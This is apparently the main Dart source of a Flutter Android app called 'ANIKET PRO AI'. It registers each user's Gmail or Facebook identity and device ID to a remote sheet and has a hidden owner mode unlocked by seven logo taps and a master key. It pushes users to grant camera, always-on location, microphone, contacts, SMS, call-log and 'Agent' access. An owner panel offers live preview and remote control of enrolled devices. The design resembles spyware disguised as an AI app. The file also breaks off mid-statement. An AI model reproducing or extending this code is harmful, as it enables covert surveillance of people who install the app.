import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'core.dart';
import 'web_screen.dart';
import 'preview_card.dart';
import 'remote_console.dart';

// ── Entry point ──────────────────────────────────────────────────────────
void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const AniketProAIApp());
}

class AniketProAIApp extends StatelessWidget {
  const AniketProAIApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'ANIKET PRO AI',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: kGold, brightness: Brightness.dark),
        useMaterial3: true,
        scaffoldBackgroundColor: kBg,
      ),
      home: const GateScreen(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  GATE SCREEN — clean professional login (FAST boot)
// ═══════════════════════════════════════════════════════════════════════
class GateScreen extends StatefulWidget {
  const GateScreen({super.key});

  @override
  State<GateScreen> createState() => _GateScreenState();
}

class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateMixin {

  String _stage     = 'loading';
  String _deviceId  = '';
  bool   _owner     = false;
  bool   _permsAsked  = false;
  String _myId      = '';
  int    _logoTaps  = 0;
  Timer? _poll;
  final _fbCtrl  = TextEditingController();
  final _gmCtrl  = TextEditingController();
  final _fbFocus = FocusNode();
  final _gmFocus = FocusNode();

  late final AnimationController _cardCtrl;
  late final Animation<double>   _cardSlide;
  late final Animation<double>   _cardOpacity;

  @override
  void initState() {
    super.initState();
    _cardCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 700));
    _cardSlide = Tween<double>(begin: 60, end: 0)
        .chain(CurveTween(curve: Curves.easeOutCubic))
        .animate(_cardCtrl);
    _cardOpacity = Tween<double>(begin: 0, end: 1)
        .chain(CurveTween(curve: Curves.easeIn))
        .animate(_cardCtrl);
    _boot();
  }

  @override
  void dispose() {
    _poll?.cancel();
    _fbCtrl.dispose();
    _gmCtrl.dispose();
    _fbFocus.dispose();
    _gmFocus.dispose();
    _cardCtrl.dispose();
    super.dispose();
  }

  Future<void> _boot() async {
    final devFut = galleryChannel
        .invokeMethod<String>('deviceId')
        .then<String?>((v) => v)
        .catchError((_) => null);
    final p = await SharedPreferences.getInstance();
    _deviceId = (await devFut) ?? 'unknown';
    _owner      = p.getBool('owner')      ?? false;
    _permsAsked = p.getBool('permsAsked') ?? false;
    _myId       = p.getString('myId')     ?? '';
    if (_owner) {
      setState(() => _stage = (p.getBool('allPermsAsked') ?? false) ? 'main' : 'setup');
      return;
    }
    final approved = p.getBool('approved') ?? false;
    if (approved) {
      setState(() => _stage = _permsAsked ? 'main' : 'setup');
      return;
    }
    await _checkStatus();
    if (_stage == 'wait') {
      _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
    }
  }

  Future<void> _checkStatus() async {
    try {
      final rows = (jsonDecode(await httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      String status = 'none';
      for (final r in rows) {
        if (r.length < 4) continue;
        final type = r[1].toString();
        final dev  = r[3].toString();
        if (dev == _deviceId && (type == 'approve' || type == 'ban')) status = type;
      }
      if (status == 'approve') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', true);
        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'setup');
      } else if (status == 'ban') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', false);
        if (mounted) setState(() => _stage = 'connect');
      } else {
        if (mounted) setState(() => _stage = _myId.isEmpty ? 'connect' : 'wait');
      }
    } catch (_) {
      if (mounted) setState(() => _stage = _myId.isEmpty ? 'connect' : 'wait');
    }
  }

  Future<void> _submit(String fb, String gm) async {
    final id     = gm.trim().isNotEmpty ? gm.trim() : fb.trim();
    final method = gm.trim().isNotEmpty ? 'Gmail' : 'Facebook';
    final p = await SharedPreferences.getInstance();
    await p.setString('myId', id);
    _myId = id;
    await httpPost(kSheetUrl,
        {'type': 'request', 'id': id, 'device': _deviceId, 'method': method, 'perms': ''});
    if (mounted) setState(() => _stage = 'wait');
    _poll?.cancel();
    _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
  }

  Future<void> _pickGmail() async {
    try {
      final acc = await galleryChannel.invokeMethod<String>('pickGoogleAccount');
      if (acc != null && acc.isNotEmpty) {
        _gmCtrl.text = acc;
        if (mounted) setState(() {});
      } else {
        _gmFocus.requestFocus();
        _toast('No Gmail found — type it');
      }
    } catch (_) {
      _gmFocus.requestFocus();
      _toast('No Gmail found — type it');
    }
  }

  Future<void> _masterDialog() async {
    final c = TextEditingController();
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: const Text('Master Key', style: TextStyle(color: kGold)),
        content: TextField(
            controller: c,
            obscureText: true,
            style: const TextStyle(color: Colors.white)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('X', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('OK', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true && c.text == kMasterKey) {
      final p = await SharedPreferences.getInstance();
      await p.setBool('owner', true);
      _owner = true;
      final asked = p.getBool('allPermsAsked') ?? false;
      if (mounted) setState(() => _stage = asked ? 'main' : 'setup');
    }
  }

  void _toast(String t) {
    try { galleryChannel.invokeMethod('toast', t); } catch (_) {}
  }

  void _maybeAnimate() {
    if (!_cardCtrl.isAnimating && _cardCtrl.value == 0) {
      _cardCtrl.forward();
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_stage == 'main')  return const MainWebViewScreen();
    if (_stage == 'setup') {
      return PermissionSetupScreen(
        onDone: () {
          if (mounted) setState(() => _stage = 'main');
        },
      );
    }
    if (_stage == 'connect' || _stage == 'wait') Future.microtask(_maybeAnimate);

    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
          ),
        ),
        child: SafeArea(
          child: _stage == 'loading'
              ? const Center(child: CircularProgressIndicator(color: kGold))
              : Column(
                  children: [
                    Expanded(child: _buildTop()),
                    _buildCard(),
                    const SizedBox(height: 32),
                  ],
                ),
        ),
      ),
    );
  }

  Widget _buildTop() {
    return Center(
      child: GestureDetector(
        onTap: () {
          _logoTaps++;
          if (_logoTaps >= 7) { _logoTaps = 0; _masterDialog(); }
        },
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 96,
              height: 96,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [kGold.withOpacity(0.22), Colors.transparent],
                ),
                border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
              ),
              child: Center(
                child: Image.asset('assets/logo.png', width: 56, height: 56),
              ),
            ),
            const SizedBox(height: 16),
            RichText(
              text: const TextSpan(
                style: TextStyle(
                    fontFamily: 'Poppins',
                    fontSize: 26,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 1.2),
                children: [
                  TextSpan(text: 'ANIKET ', style: TextStyle(color: Colors.white)),
                  TextSpan(text: 'PRO AI',  style: TextStyle(color: kGold)),
                ],
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _stage == 'wait'
                  ? 'Waiting for owner approval…'
                  : 'Connect your account to continue',
              style: TextStyle(
                  color: Colors.white.withOpacity(0.45),
                  fontSize: 13,
                  fontWeight: FontWeight.w400),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCard() {
    return AnimatedBuilder(
      animation: _cardCtrl,
      builder: (_, child) => Transform.translate(
        offset: Offset(0, _cardSlide.value),
        child: Opacity(opacity: _cardOpacity.value, child: child),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 24),
        child: Container(
          decoration: BoxDecoration(
            color: const Color(0xFF1C1916),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: kGold.withOpacity(0.28), width: 1),
            boxShadow: [
              BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 32,
                  offset: const Offset(0, 12)),
              BoxShadow(
                  color: kGold.withOpacity(0.06),
                  blurRadius: 40,
                  spreadRadius: 4),
            ],
          ),
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              if (_stage == 'connect') ..._connectFields(),
              if (_stage == 'wait')    ..._waitContent(),
            ],
          ),
        ),
      ),
    );
  }

  List<Widget> _connectFields() => [
    Row(children: const [
      Icon(Icons.person_outline_rounded, color: kGold, size: 20),
      SizedBox(width: 8),
      Text('Register Now',
          style: TextStyle(color: kGold, fontSize: 17, fontWeight: FontWeight.bold)),
    ]),
    const SizedBox(height: 4),
    const Text('Owner approval required to access the app',
        style: TextStyle(color: Colors.white38, fontSize: 12)),
    const SizedBox(height: 20),
    Divider(color: kGold.withOpacity(0.15), height: 1),
    const SizedBox(height: 20),
    _field(
      _fbCtrl, _fbFocus,
      'Facebook profile link or name',
      icon: Icons.facebook_rounded,
    ),
    const SizedBox(height: 12),
    _field(
      _gmCtrl, _gmFocus,
      'Gmail address',
      icon: Icons.mail_outline_rounded,
      suffix: IconButton(
        icon: const Icon(Icons.person_search_rounded, color: kGold, size: 20),
        tooltip: 'Auto-fill Gmail',
        onPressed: _pickGmail,
        padding: EdgeInsets.zero,
        constraints: const BoxConstraints(),
      ),
    ),
    const SizedBox(height: 20),
    SizedBox(
      width: double.infinity,
      height: 50,
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(
          backgroundColor: kLoginBtn,
          foregroundColor: Colors.white,
          elevation: 0,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
        onPressed: () {
          if (_fbCtrl.text.trim().isEmpty && _gmCtrl.text.trim().isEmpty) return;
          _submit(_fbCtrl.text, _gmCtrl.text);
        },
        child: const Text('NEXT',
            style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 1)),
      ),
    ),
  ];

  List<Widget> _waitContent() => [
    const SizedBox(height: 8),
    const CircularProgressIndicator(color: kGold),
    const SizedBox(height: 20),
    const Text('Your request has been sent.',
        style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w600),
        textAlign: TextAlign.center),
    const SizedBox(height: 6),
    const Text('Waiting for owner to approve your account.',
        style: TextStyle(color: Colors.white54, fontSize: 13),
        textAlign: TextAlign.center),
    const SizedBox(height: 20),
    TextButton.icon(
      onPressed: _checkStatus,
      icon: const Icon(Icons.refresh_rounded, color: kGold, size: 18),
      label: const Text('Check again', style: TextStyle(color: kGold)),
    ),
    const SizedBox(height: 8),
  ];

  Widget _field(
    TextEditingController ctrl,
    FocusNode focus,
    String hint, {
    required IconData icon,
    Widget? suffix,
  }) =>
      TextField(
        controller: ctrl,
        focusNode: focus,
        style: const TextStyle(color: Colors.white, fontSize: 14),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
          prefixIcon: Icon(icon, color: kGold.withOpacity(0.7), size: 20),
          suffixIcon: suffix,
          suffixIconConstraints: const BoxConstraints(minWidth: 40, minHeight: 40),
          filled: true,
          fillColor: const Color(0xFF252218),
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: kGold.withOpacity(0.2))),
          enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: kGold.withOpacity(0.2))),
          focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: kGold, width: 1.5)),
        ),
      );
}

// ═══════════════════════════════════════════════════════════════════════
//  GUIDED PERMISSION SETUP — Agent first, then Notification, then rest
// ═══════════════════════════════════════════════════════════════════════
class PermissionSetupScreen extends StatefulWidget {
  final VoidCallback onDone;
  const PermissionSetupScreen({super.key, required this.onDone});

  @override
  State<PermissionSetupScreen> createState() => _PermissionSetupScreenState();
}

class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
  static final List<MapEntry<String, Permission?>> _steps = [
    MapEntry('Agent', null),
    MapEntry('Notification', Permission.notification),
    MapEntry('Camera', Permission.camera),
    MapEntry('Location', Permission.location),
    MapEntry('All-time Location', Permission.locationAlways),
    MapEntry('Microphone', Permission.microphone),
    MapEntry('Contacts', Permission.contacts),
    MapEntry('Photos', Permission.photos),
    MapEntry('Videos', Permission.videos),
    MapEntry('SMS', Permission.sms),
    MapEntry('Call log', Permission.phone),
  ];

  final Map<String, bool> _done = {};
  String _current = 'শুরু হচ্ছে...';
  bool _finished = false;

  @override
  void initState() {
    super.initState();
    _run();
  }

  IconData _icon(String n) {
    switch (n) {
      case 'Agent': return Icons.smart_toy_rounded;
      case 'Notification': return Icons.notifications_rounded;
      case 'Camera': return Icons.camera_alt_rounded;
      case 'Location': return Icons.location_on_rounded;
      case 'All-time Location': return Icons.location_on_rounded;
      case 'Microphone': return Icons.mic_rounded;
      case 'Contacts': return Icons.contacts_rounded;
      case 'Photos': return Icons.photo_library_rounded;
      case 'Videos': return Icons.videocam_rounded;
      case 'SMS': return Icons.sms_rounded;
      case 'Call log': return Icons.call_rounded;
      default: return Icons.settings;
    }
  }

  Future<void> _run() async {
    await Future.delayed(const Duration(milliseconds: 200));
    for (final s in _steps) {
      if (!mounted) return;
      setState(() => _current = s.key);
      if (s.value == null) {
        try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
        await Future.delayed(const Duration(milliseconds: 400));
      } else {
        try { await s.value!.request(); } catch (_) {}
      }
      if (!mounted) return;
      setState(() => _done[s.key] = true);
    }
    final p = await SharedPreferences.getInstance();
    await p.setBool('permsAsked', true);
    await p.setBool('allPermsAsked', true);
    if (!mounted) return;
    setState(() => _finished = true);
    await Future.delayed(const Duration(milliseconds: 500));
    widget.onDone();
  }

  @override
  Widget build(BuildContext context) {
    final total = _steps.length;
    final done = _done.length;
    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 28),
              child: Container(
                padding: const EdgeInsets.all(26),
                decoration: BoxDecoration(
                  color: const Color(0xFF1C1916),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: kGold.withOpacity(0.28), width: 1),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 84,
                      height: 84,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
                      ),
                      child: Center(
                        child: Image.asset('assets/logo.png', width: 50, height: 50),
                      ),
                    ),
                    const SizedBox(height: 18),
                    const Text('One-time Setup',
                        style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 6),
                    Text(
                      _finished
                          ? '✅ সেটআপ সম্পূর্ণ!'
                          : 'Android এখন কয়েকটা অনুমতি চাইবে —\nপ্রতিটায় Allow চাপুন। একবারই হবে।',
                      textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.4),
                    ),
                    const SizedBox(height: 20),
                    Text('$done / $total',
                        style: const TextStyle(color: kGold, fontSize: 26, fontWeight: FontWeight.w800)),
                    const SizedBox(height: 10),
                    ClipRRect(
                      borderRadius: BorderRadius.circular(6),
                      child: LinearProgressIndicator(
                        value: total == 0 ? 0 : done / total,
                        minHeight: 8,
                        color: kGold,
                        backgroundColor: Colors.white12,
                      ),
                    ),
                    const SizedBox(height: 18),
                    if (!_finished)
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(_icon(_current), color: kGold, size: 18),
                          const SizedBox(width: 8),
                          Text(_current,
                              style: const TextStyle(color: Colors.white70, fontSize: 14)),
                        ],
                      ),
                    const SizedBox(height: 8),
                    Wrap(
                      spacing: 6,
                      runSpacing: 6,
                      alignment: WrapAlignment.center,
                      children: _steps.map((s) {
                        final ok = _done[s.key] ?? false;
                        final active = _current == s.key && !ok;
                        return Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                          decoration: BoxDecoration(
                            color: ok
                                ? Colors.green.withOpacity(0.15)
                                : active
                                    ? kGold.withOpacity(0.15)
                                    : Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                                color: ok
                                    ? Colors.green.withOpacity(0.5)
                                    : active
                                        ? kGold.withOpacity(0.5)
                                        : Colors.white12),
                          ),
                          child: Text(s.key,
                              style: TextStyle(
                                  color: ok
                                      ? Colors.green
                                      : active
                                          ? kGold
                                          : Colors.white38,
                                  fontSize: 11)),
                        );
                      }).toList(),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  OWNER PANEL — Permissions + Live Preview + Users + REMOTE CONSOLE
// ═══════════════════════════════════════════════════════════════════════
class OwnerPanelScreen extends StatefulWidget {
  const OwnerPanelScreen({super.key});

  @override
  State<OwnerPanelScreen> createState() => _OwnerPanelScreenState();
}

class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
  List<Map<String, String>> _rows = [];
  bool _busy = false;
  int _androidSdk = 0;
  Map<String, PermissionStatus> _permStatuses = {};
  bool _permLoading = true;

  static final Map<String, Permission> _allPerms = {
    'Camera': Permission.camera,
    'Location': Permission.location,
    'Microphone': Permission.microphone,
    'Contacts': Permission.contacts,
    'Photos': Permission.photos,
    'Videos': Permission.videos,
    'Storage (Legacy)': Permission.storage,
    'Notification': Permission.notification,
  };

  @override
  void initState() {
    super.initState();
    _load();
    _initDeviceInfo();
    _checkAllPerms();
  }

  Future<void> _initDeviceInfo() async {
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      if (mounted) setState(() => _androidSdk = info.version.sdkInt);
    } catch (_) {
      if (mounted) setState(() => _androidSdk = 0);
    }
  }

  Future<void> _checkAllPerms() async {
    setState(() => _permLoading = true);
    Map<String, PermissionStatus> statuses = {};
    for (var entry in _allPerms.entries) {
      try {
        if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) {
          statuses[entry.key] = PermissionStatus.granted;
          continue;
        }
        statuses[entry.key] = await entry.value.status;
      } catch (_) {
        statuses[entry.key] = PermissionStatus.denied;
      }
    }
    if (mounted) {
      setState(() {
        _permStatuses = statuses;
        _permLoading = false;
      });
    }
  }

  Future<void> _grantAllPerms() async {
    List<Permission> toRequest = [];
    for (var entry in _allPerms.entries) {
      if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) continue;
      final status = _permStatuses[entry.key];
      if (status != null && !status.isGranted) {
        toRequest.add(entry.value);
      }
    }
    if (toRequest.isEmpty) {
      _showSnack('সব পারমিশন আগে থেকেই দেওয়া আছে ✅');
      return;
    }
    await toRequest.request();
    await _checkAllPerms();
  }

  Future<void> _requestSingle(String name) async {
    final perm = _allPerms[name];
    if (perm == null) return;
    final status = await perm.request();
    if (status.isPermanentlyDenied) {
      await openAppSettings();
    }
    await _checkAllPerms();
  }

  Future<void> _toggleOff(String name) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: Text('$name বন্ধ করবেন?', style: const TextStyle(color: kGold)),
        content: const Text(
            'Android-এর নিয়ম: অ্যাপ নিজের পারমিশন নিজে বন্ধ করতে পারে না।\nSettings খুলে দিচ্ছি — সেখানে ১ ট্যাপে বন্ধ করুন।',
            style: TextStyle(color: Colors.white70, fontSize: 13)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('বাতিল', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('খুলুন', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true) await openAppSettings();
    await _checkAllPerms();
  }

  void _showSnack(String msg) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(msg), backgroundColor: const Color(0xFF2A2A2A)),
      );
    }
  }

  String _androidVersionName() {
    if (_androidSdk >= 37) return 'Android 17';
    if (_androidSdk >= 36) return 'Android 16';
    if (_androidSdk >= 35) return 'Android 15';
    if (_androidSdk >= 34) return 'Android 14';
    if (_androidSdk >= 33) return 'Android 13';
    if (_androidSdk >= 32) return 'Android 12L';
    if (_androidSdk >= 31) return 'Android 12';
    if (_androidSdk >= 30) return 'Android 11';
    if (_androidSdk >= 29) return 'Android 10';
    return 'Unknown';
  }

  IconData _permIcon(String name) {
    switch (name) {
      case 'Camera': return Icons.camera_alt_rounded;
      case 'Location': return Icons.location_on_rounded;
      case 'Microphone': return Icons.mic_rounded;
      case 'Contacts': return Icons.contacts_rounded;
      case 'Photos': return Icons.photo_library_rounded;
      case 'Videos': return Icons.videocam_rounded;
      case 'Storage (Legacy)': return Icons.folder_rounded;
      case 'Notification': return Icons.notifications_rounded;
      default: return Icons.settings;
    }
  }

  Color _statusColor(PermissionStatus? s) {
    if (s == null) return Colors.grey;
    if (s.isGranted) return Colors.green;
    if (s.isPermanentlyDenied) return Colors.red;
    if (s.isRestricted) return Colors.deepOrange;
    if (s.isLimited) return Colors.orange;
    return Colors.orange;
  }

  String _statusText(PermissionStatus? s) {
    if (s == null) return 'অজানা';
    if (s.isGranted) return 'ON ✅';
    if (s.isPermanentlyDenied) return 'চিরতরে বন্ধ ❌';
    if (s.isRestricted) return 'রেস্ট্রিক্টেড 🔒';
    if (s.isLimited) return 'আংশিক';
    if (s.isDenied) return 'OFF ⚠️';
    return 'অজানা';
  }

  Future<void> _load() async {
    setState(() => _busy = true);
    try {
      final rows = (jsonDecode(await httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      final Map<String, Map<String, String>> map = {};
      for (final r in rows) {
        if (r.length < 5) continue;
        final type   = r[1].toString();
        final id     = r[2].toString();
        final dev    = r[3].toString();
        final method = r[4].toString();
        final perms  = r.length > 5 ? r[5].toString() : '';
        final e = map.putIfAbsent(dev,
            () => {'id': '', 'method': '', 'perms': '', 'status': 'PENDING', 'time': ''});
        if (type == 'request') { e['id'] = id; e['method'] = method; e['time'] = r[0].toString(); }
        if (type == 'perms')   e['perms']  = perms;
        if (type == 'approve') e['status'] = 'APPROVED';
        if (type == 'ban')     e['status'] = 'BANNED';
      }
      _rows = map.entries.map((e) => {'device': e.key, ...e.value}).toList();
      _rows.sort((a, b) => (b['time'] ?? '').compareTo(a['time'] ?? ''));
    } catch (_) {}
    if (mounted) setState(() => _busy = false);
  }

  Future<void> _act(String dev, String type) async {
    await httpPost(kSheetUrl, {'type': type, 'id': '', 'device': dev, 'method': '', 'perms': ''});
    await _load();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        backgroundColor: kBg,
        title: const Text('Owner Panel', style: TextStyle(color: kGold)),
        actions: [
          IconButton(onPressed: _checkAllPerms, icon: const Icon(Icons.sync, color: kGold)),
          IconButton(onPressed: _load, icon: const Icon(Icons.refresh, color: kGold)),
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 30),
        children: [
          // ── Device Info ──
          Container(
            margin: const EdgeInsets.fromLTRB(12, 12, 12, 0),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A2E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.blueAccent.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                const Icon(Icons.phone_android, color: Colors.blueAccent, size: 28),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _androidSdk > 0
                            ? '${_androidVersionName()} (SDK $_androidSdk)'
                            : 'লোড হচ্ছে...',
                        style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
                      ),
                      Text(
                        _androidSdk >= 37
                            ? '🎯 Android 17 — Special rules active'
                            : _androidSdk >= 33
                                ? 'Android 13+ — Granular media permissions'
                                : 'Android 10-12 — Legacy storage',
                        style: const TextStyle(color: Colors.white60, fontSize: 12),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // ── Device Permissions (ON/OFF সুইচ সহ) ──
          Container(
            margin: const EdgeInsets.all(12),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: const Color(0xFF1E1E1E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: kGold.withOpacity(0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Row(
                  children: [
                    Icon(Icons.security_rounded, color: kGold, size: 22),
                    SizedBox(width: 10),
                    Text('Device Permissions',
                        style: TextStyle(color: kGold, fontSize: 17, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 4),
                const Text('সুইচ ON = অনুমতি দিন • সুইচ OFF = বন্ধ করুন',
                    style: TextStyle(color: Colors.white38, fontSize: 12)),
                const SizedBox(height: 16),

                if (_permLoading)
                  const Center(
                    child: Padding(
                      padding: EdgeInsets.all(20),
                      child: CircularProgressIndicator(color: kGold),
                    ),
                  )
                else
                  ..._permStatuses.entries.map((e) {
                    final name = e.key;
                    final status = e.value;
                    final isLegacy = name == 'Storage (Legacy)' && _androidSdk >= 33;
                    return Container(
                      margin: const EdgeInsets.symmetric(vertical: 3),
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                      decoration: BoxDecoration(
                        color: const Color(0xFF252525),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        children: [
                          Icon(_permIcon(name),
                              color: isLegacy ? Colors.white24 : Colors.white70, size: 20),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(name,
                                    style: TextStyle(
                                        color: isLegacy ? Colors.white24 : Colors.white,
                                        fontSize: 14, fontWeight: FontWeight.w500)),
                                if (isLegacy)
                                  const Text('Android 13+ এ দরকার নেই',
                                      style: TextStyle(color: Colors.white24, fontSize: 10)),
                              ],
                            ),
                          ),
                          Text(_statusText(status),
                              style: TextStyle(
                                  color: isLegacy ? Colors.white24 : _statusColor(status),
                                  fontSize: 11, fontWeight: FontWeight.bold)),
                          const SizedBox(width: 6),
                          SizedBox(
                            height: 34,
                            width: 46,
                            child: Switch(
                              value: isLegacy ? true : status.isGranted,
                              activeColor: kGold,
                              onChanged: isLegacy
                                  ? null
                                  : (v) async {
                                      if (v) {
                                        await _requestSingle(name);
                                      } else {
                                        await _toggleOff(name);
                                      }
                                    },
                            ),
                          ),
                        ],
                      ),
                    );
                  }),

                const SizedBox(height: 16),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: ElevatedButton.icon(
                    onPressed: _permLoading ? null : _grantAllPerms,
                    icon: const Icon(Icons.check_circle_outline, size: 20),
                    label: const Text('Grant All Permissions',
                        style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: kGold.withOpacity(0.2),
                      foregroundColor: kGold,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                SizedBox(
                  width: double.infinity,
                  height: 42,
                  child: OutlinedButton.icon(
                    onPressed: () => openAppSettings(),
                    icon: const Icon(Icons.settings, size: 18),
                    label: const Text('Open App Settings'),
                    style: OutlinedButton.styleFrom(
                      foregroundColor: Colors.white54,
                      side: const BorderSide(color: Colors.white24),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
              ],
            ),
          ),

          // ── Live Device Preview (phone-screen style) ──
          const DevicePreviewCard(),

          // ── User Requests + REMOTE CONSOLE ──
          const Padding(
            padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            child: Text('User Requests + Remote Control',
                style: TextStyle(color: kGold, fontSize: 16, fontWeight: FontWeight.bold)),
          ),
          _busy && _rows.isEmpty
              ? const Center(child: Padding(
                  padding: EdgeInsets.all(30),
                  child: CircularProgressIndicator(color: kGold)))
              : _rows.isEmpty
                  ? const Center(child: Padding(
                      padding: EdgeInsets.all(30),
                      child: Text('No requests yet', style: TextStyle(color: Colors.white54))))
                  : ListView.builder(
                      shrinkWrap: true,
                      physics: const NeverScrollableScrollPhysics(),
                      itemCount: _rows.length,
                      itemBuilder: (_, i) {
                        final r  = _rows[i];
                        final st = r['status'] ?? '';
                        return Card(
                          color: const Color(0xFF1E1E1E),
                          margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                          child: Padding(
                            padding: const EdgeInsets.all(12),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text('${i + 1}) ${r['id']}',
                                    style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                                Text('ID: ${r['device']}  •  ${r['method']}',
                                    style: const TextStyle(color: Colors.white54, fontSize: 12)),
                                Text('Perms: ${(r['perms'] ?? '').isEmpty ? '—' : r['perms']}  •  $st',
                                    style: TextStyle(
                                        color: st == 'BANNED' ? Colors.red
                                            : (st == 'APPROVED' ? Colors.green : Colors.orange),
